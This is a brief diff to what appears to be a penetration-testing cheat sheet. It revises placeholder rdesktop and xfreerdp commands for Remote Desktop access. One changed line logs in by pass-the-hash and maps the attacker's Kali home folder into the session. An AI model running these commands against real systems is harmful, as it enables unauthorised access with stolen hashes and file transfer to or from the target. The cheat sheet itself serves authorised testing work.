@@ -76,8 +76,8 @@ rdesktop <Target_IP> -d '<DOMAIN>' -u '<User>' -p '<Pwd>' -r disk:kali=/home/kal
 OR
 
 ```bash
-xfreerdp /v:<Target_IP> /d:<DOMAIN> /u:<User> /p:<Pwd>
+xfreerdp /v:<Target_IP> /d:'<DOMAIN>' /u:'<User>' /p:'<Pwd>'
 
 
-xfreerdp /v:<Target_IP> /d:<DOMAIN> /u:<User> /pth:<HASH>
+xfreerdp /v:<Target_IP> /d:'<DOMAIN>' /u:'<User>' /pth:'<HASH>' /drive:kali,/home/kali
 ```
